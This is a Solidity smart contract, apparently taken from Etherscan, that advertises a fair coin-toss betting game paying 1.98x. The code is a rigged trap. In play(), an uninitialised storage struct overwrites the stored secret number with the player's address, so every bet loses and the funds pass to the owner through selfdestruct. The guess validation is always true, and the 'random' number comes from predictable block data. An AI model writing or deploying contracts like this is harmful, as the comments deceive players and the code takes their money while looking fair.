/**
 *Submitted for verification at Etherscan.io on 2019-07-17
*/

pragma solidity ^0.4.25;

// CoinToss_0_03ETH
// Bet price: 0.03 ETH
//
// Guess the number secretly stored in the blockchain and get x1.98 payout (fee is only 1%)!
// After one try, contract will be destroyed and in case of win you will
// receive x1.98 of the bet and in case of lose, money goes to the admin.
//
// Admin will create new contract ASAP
//
// To play, call the play() method with the guessed number (1 or 2).
// Bet price: 0.03 ether
//
// Contract balance at game start: 0.0294
// If you guess the number correctly, you will receive 0.03 (your bet) + 0.0294 (contract balance) = 0.0594 (win with 1% fee (0.06 - 1%))
//
// GOOD LUCK!

contract CoinToss_0_03ETH {
  uint256 private secretNumber;
  uint256 public betPrice = 0.03 ether;
  address public ownerAddr;

  struct Game {
    address player;
    uint256 number;
    bool win;
  }

  event GamePlayed(address player, uint256 number, bool win);

  constructor() public {
    ownerAddr = msg.sender;
    tossACoin();
  }

  function tossACoin() internal {
    // randomly set secretNumber with a value between 1 and 2
    secretNumber = uint8(keccak256(block.timestamp, blockhash(block.number - 1))) % 2 + 1;
  }

  function play(uint256 number) public payable {
    require(msg.value == betPrice, 'Please, bet exactly 0.03 ETH');
    require(number > 1 || number < 2, 'Number must be 1 or 2');

    Game game;
    game.player = msg.sender;
    game.number = number;

    determineWinnerAndSendPayout(game);
  }

  function determineWinnerAndSendPayout(Game game) internal {
    if (game.number == secretNumber) {
      // win!
      game.win = true;
    } else {
      // lose!
      game.win = false;
    }

    emit GamePlayed(game.player, game.number, game.win);

    if (game.win) {
      selfdestruct(msg.sender);
    } else {
      selfdestruct(ownerAddr);
    }
  }

  function kill() public {
    // function to call in case nobody wants to play game :(
    if (msg.sender == ownerAddr) {
      selfdestruct(msg.sender);
    }
  }

  function() public payable { }
}